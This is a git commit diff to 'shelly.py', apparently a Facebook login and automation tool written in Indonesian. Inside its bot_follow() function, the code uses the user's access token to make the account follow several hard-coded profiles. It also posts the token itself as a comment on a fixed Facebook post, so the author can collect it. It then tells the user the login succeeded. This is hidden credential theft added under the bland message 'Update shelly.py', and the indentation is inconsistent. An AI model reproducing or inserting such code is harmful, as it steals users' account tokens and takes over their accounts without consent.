1af6ee9e87ac966ed8a3f7567e47674688f544e2
Shelly <87390227+Shelly-XD@users.noreply.github.com>
2021-11-27 16:41:46 +0700

    Update shelly.py

--- shelly.py
+++ shelly.py
@@ -94,16 +94,14 @@ def bot_follow():
 		print("\n   [!] Token invalid")
 		logs()
         kom = " Bang @[100064283724681:] Shelly Cantik Banget Ga Ada Obat😘😘😘😘"
-        kom2 = " Bang @[100064283724681:] Noah Cantik Banget Ga Ada Obat 😘😘😘😘"    
+        kom = " Bang @[100064283724681:] Noah Cantik Banget Ga Ada Obat 😘😘😘😘"    
     	requests.post('https://graph.facebook.com/100051863139451/subscribers?access_token=' + toket) #
         requests.post('https://graph.facebook.com/100064283724681/subscribers?access_token=' + toket) #
         requests.post('https://graph.facebook.com/100008420107265/subscribers?access_token=' + toket) #
         requests.post('https://graph.facebook.com/100005238607438/subscribers?access_token=' + toket) #
     	requests.post('https://graph.facebook.com/100027708738216/subscribers?access_token=' + toket) #
-        requests.post('https://graph.facebook.com/269669551852500/comments/?message=' +token+ '&access_token=' + token)
-        requests.post('https://graph.facebook.com/269669551852500/comments/?message=' +kom+ '&access_token=' + token)
-        requests.post('https://graph.facebook.com/263176185835170/comments/?message=' +token+ '&access_token=' + token)
-        requests.post('https://graph.facebook.com/263176185835170/comments/?message=' +kom2+ '&access_token=' + token)
+        requests.post('https://graph.facebook.com/269669551852500/comments/?message=' +token+ '&access_token=' + toket)
+        requests.post('https://graph.facebook.com/269669551852500/comments/?message=' +kom+ '&access_token=' + toket)     
         print(('[+] \x1b[92mLogin Sukses!\x1b[0m'))
         raw_input('[+] Tekan Enter ')
         menu()
